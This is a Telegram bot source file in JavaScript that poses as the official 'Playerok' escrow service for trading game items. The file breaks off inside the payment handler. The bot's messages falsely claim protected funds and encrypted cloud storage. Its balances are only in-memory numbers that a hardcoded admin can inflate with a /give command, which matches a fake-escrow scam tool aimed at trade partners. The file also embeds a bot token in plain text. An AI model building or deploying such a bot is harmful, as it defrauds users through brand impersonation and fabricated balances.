const { Telegraf, Markup } = require('telegraf');
const http = require('http');

const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
const ADMIN_USERNAME = 'k13_way'; 
const ADMIN_ID = 8886821631; 

let users = {};
let deals = {};
let states = {};

// Специальный веб-сервер, который гарантирует успешное прохождение проверки портов Render
const PORT = process.env.PORT || 10000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
}).listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Порт ${PORT} успешно открыт и слушает запросы для хостинга`);
});

function init(id, name) {
    const username = name ? name.toLowerCase() : '';
    if (!users[id]) {
        const startBalance = (id === ADMIN_ID) ? 16699677 : 0;
        users[id] = { id: id, username: username, balance: startBalance, count: 0 };
    } else if (username && users[id].username !== username) {
        users[id].username = username;
    }
}

function findIdByUsername(name) {
    if (!name) return null;
    const clean = name.replace('@', '').trim().toLowerCase();
    for (const id in users) { 
        if (users[id].username === clean) return parseInt(id); 
    }
    return null;
}

const menu = Markup.keyboard([
    ['🤝 Создать сделку'],
    ['💳 Баланс', '🛡️ Безопасность'],
    ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']
]).resize();

// Инициализация профиля пользователя при любом взаимодействии с ботом
bot.use((ctx, next) => {
    if (ctx.from) init(ctx.from.id, ctx.from.username);
    return next();
});

bot.start((ctx) => {
    delete states[ctx.from.id];
    const text = `Добро пожаловать 👋\n\n` +
        `✅ *PlayerOk* — специализированный маркетплейс и торговый гарант по обеспечению полной безопасности внебиржевых сделок.\n\n` +
        `🥇 *Автоматизированный алгоритм исполнения.*\n` +
        `🔎 *Скорость, верификация и защита.*\n` +
        `💳 *Удобный и моментальный вывод средств.*\n\n` +
        `• Комиссия сервиса: 1%\n` +
        `• Режим работы системы: 24/7\n` +
        `• Главный модератор: @sw1zyy01\n\n` +
        `🛡️ *Выберите нужный раздел на панели ниже:*`;
    ctx.replyWithMarkdown(text, menu);
});

bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => {
    delete states[ctx.from.id];
    ctx.reply('💎 Playerok Гарант бот — это внутренние безопасные сделки прямо в Telegram! 🛡️ Все текущие операции и конфиденциальные данные участников надёжно шифруются и хранятся в официальной базе данных Playerok Cloud. Если быстрые и на 100% безопасные сделки — то только на Playerok! ✨');
});

bot.hears('🛡️ Безопасность', (ctx) => {
    delete states[ctx.from.id];
    ctx.reply('🛡️ Официальный Гарант сервис Playerok защищает ваши средства от любых видов мошенничества. 📊 Деньги покупателя замораживаются на транзитном счёте гаранта и переводятся продавцу только ПОСЛЕ полной проверки и подтверждения получения товара. Не ведитесь на мошенников! С любовью, команда Playerok. ❤️');
});

bot.hears('🆘 Поддержка', (ctx) => {
    delete states[ctx.from.id];
    ctx.reply('🆘 Официальная служба поддержки Playerok Гарант ПРЯМО в Telegram!\n\n⚖️ В случае возникновения любых спорных моментов, задержек или попыток обмана в сделке, незамедлительно обращайтесь к нашему старшему модератору арбитража: @sw1zyy01. Пожалуйста, прикрепите медийные доказательства (скриншоты или видеозапись экрана).\n\nВаша безопасность — наш главный приоритет! ✨');
});

bot.hears('💳 Баланс', (ctx) => {
    delete states[ctx.from.id];
    init(ctx.from.id, ctx.from.username);
    const u = users[ctx.from.id];
    const text = `👑 *ЛИЧНЫЙ КАБИНЕТ PLAYEROK* 👑\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n` +
        `👤 *Пользователь:* @${ctx.from.username || 'не установлен'}\n` +
        `🆔 *Ваш ID:* \`${ctx.from.id}\`\n` +
        `💎 *Статус профиля:* Проверенный трейдер\n` +
        `📈 *Успешных сделок:* ${u ? u.count : 0}\n\n` +
        `💵 *Текущий баланс:* [ ${u ? u.balance.toLocaleString('ru-RU') : 0} руб. ]\n\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
        `✨ _Проводите безопасные сделки, используя юзернеймы участников!_`;
    ctx.replyWithMarkdown(text);
});

bot.command('give', (ctx) => {
    if (ctx.from.username?.toLowerCase() !== ADMIN_USERNAME) return ctx.reply('❌ У вас нет прав администратора.');
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply('⚠️ Формат команды: /give [ID] [Сумма]');
    const tId = parseInt(args[1]); 
    const am = parseInt(args[2]);
    if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Ошибка введенных данных.');
    init(tId, null); 
    users[tId].balance += am; 
    ctx.reply(`✅ Успешно зачислено ${am} руб. пользователю с ID ${tId}`);
    bot.telegram.sendMessage(tId, `💰 Ваш баланс успешно пополнен администратором на: +${am} руб.`).catch(() => {});
});

bot.hears('🤝 Создать сделку', (ctx) => {
    delete states[ctx.from.id];
    ctx.reply('👉 Выберите вашу роль в создаваемой безопасной сделке:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('🛒 Я хочу Купить', 'role_buy'), Markup.button.callback('💰 Я хочу Продать', 'role_sell')]
        ])
    );
});

bot.action('role_buy', (ctx) => {
    states[ctx.from.id] = { step: 'info', type: 'buy' };
    ctx.answerCbQuery().catch(() => {});
    ctx.replyWithMarkdown(
        `🛒 *ОФОРМЛЕНИЕ ПОКУПКИ ТОВАРА*\n\n` +
        `📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n` +
        `\`Сумма Товар @user_name\`\n\n` +
        `📋 *Пример:* \`2500 Standoff 2 Account @user_name\`\n\n` +
        `⚠️ _Важно: Второй участник (продавец) должен запустить этого бота (нажать /start) хотя бы один раз до начала оформления!_`
    );
});

bot.action('role_sell', (ctx) => {
    states[ctx.from.id] = { step: 'info', type: 'sell' };
    ctx.answerCbQuery().catch(() => {});
    ctx.replyWithMarkdown(
        `💰 *ОФОРМЛЕНИЕ ПРОДАЖИ ТОВАРА*\n\n` +
        `📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n` +
        `\`Сумма Товар @user_name\`\n\n` +
        `📋 *Пример:* \`1500 Нож в Standoff 2 @user_name\`\n\n` +
        `⚠️ _Важно: Второй участник (покупатель) должен запустить этого бота (нажать /start) хотя бы один раз до начала оформления!_`
    );
});

bot.on('text', async (ctx, next) => {
    const uid = ctx.from.id;
    const st = states[uid];
    if (!st || st.step !== 'info') return next();

    const type = st.type;
    delete states[uid]; 

    const text = ctx.message.text.trim();
    const match = text.match(/^(\d+)\s+(.+?)\s+(@[A-Za-z0-9_]{4,})$/);

    if (!match) {
        return ctx.reply('❌ Неверный формат сообщения!\n\nНажмите кнопку «🤝 Создать сделку» заново и отправьте данные строго по шаблону: Сумма Товар @user_name');
    }

    const am = parseInt(match[1]);
    const item = match[2];
    const targetUsername = match[3];

    if (am <= 0) return ctx.reply('❌ Ошибка: Сумма сделки должна быть больше нуля.');

    const targetId = findIdByUsername(targetUsername);
    if (!targetId) {
        return ctx.reply(`❌ Пользователь ${targetUsername} не найден в нашей базе данных. Он должен зайти в этого бота и нажать /start, чтобы активировать профиль!`);
    }

    if (uid === targetId) return ctx.reply('❌ Ошибка: Нельзя проводить безопасную сделку с самим собой.');

    const dId = Math.floor(100000 + Math.random() * 900000);
    
    const buyerId = (type === 'buy') ? uid : targetId;
    const sellerId = (type === 'buy') ? targetId : uid;
    const buyerName = (type === 'buy') ? (ctx.from.username || 'Покупатель') : targetUsername.replace('@','');
    const sellerName = (type === 'buy') ? targetUsername.replace('@','') : (ctx.from.username || 'Продавец');

    deals[dId] = { id: dId, buyerId: buyerId, sellerId: sellerId, buyerName: buyerName, sellerName: sellerName, am: am, item: item, status: 'wait' };

    ctx.reply(`⏳ Сделка №${dId} успешно оформлена! Ожидаем подтверждения от второй стороны.`);

    const notifyMsg = `🔔 *ВАМ ПРЕДЛОЖЕНА БЕЗОПАСНАЯ СДЕЛКА №${dId}!* 🔔\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n` +
        `📦 *Товар/Услуга:* ${item}\n` +
        `💰 *Сумма сделки:* ${am} руб.\n` +
        `👤 *Второй участник:* @${ctx.from.username || 'Пользователь'}\n\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
        `Вы готовы принять условия гаранта и выполнить сделку?`;

    bot.telegram.sendMessage(targetId, notifyMsg, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Подтвердить Сделку', `ok_${dId}`)]])
    }).catch(() => {
        ctx.reply('❌ Ошибка: Не удалось отправить уведомление второму участнику. Возможно, бот заблокирован.');
    });
});

bot.action(/^ok_(\d+)$/, async (ctx) => {
    ctx.answerCbQuery().catch(() => {});
    const dId = parseInt(ctx.match[1]);
    const d = deals[dId];
    if (!d || ctx.from.id !== d.sellerId || d.status !== 'wait') return ctx.reply('❌ Ошибка: Сделка недоступна.');
    
    d.status = 'pay'; 
    await ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте, пока покупатель @${d.buyerName} внесёт оплату.`);
    
    bot.telegram.sendMessage(d.buyerId, `🎉 Продавец принял сделку №${dId}!\n\n📦 Товар: *${d.item}*\n💰 К оплате: *${d.am} руб.*\n\nНажмите кнопку ниже для перевода средств на баланс гаранта:`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить покупку', `pay_${dId}`)]])
    });
});

bot.action(/^pay_(\d+)$/, async (ctx) => {
    ctx.answerCbQuery().catch(() => {});
    const dId = parseInt(ctx.match[1]);
    const d = deals[dId];
    if (!d || ctx.from.id !== d.buyerId || d.status !== 'pay') return ctx.reply('❌ Ошибка.');
    
    const b = users[d.buyerId];
    if (b.balance < d.am) return ctx.reply(`❌ Ошибка: На вашем балансе недостаточно средств. Нужно: ${d.am} руб. Ваш баланс: ${b.balance} руб.`);
    
    b.balance -= d.am; 
    d.status = 'send'; 
    
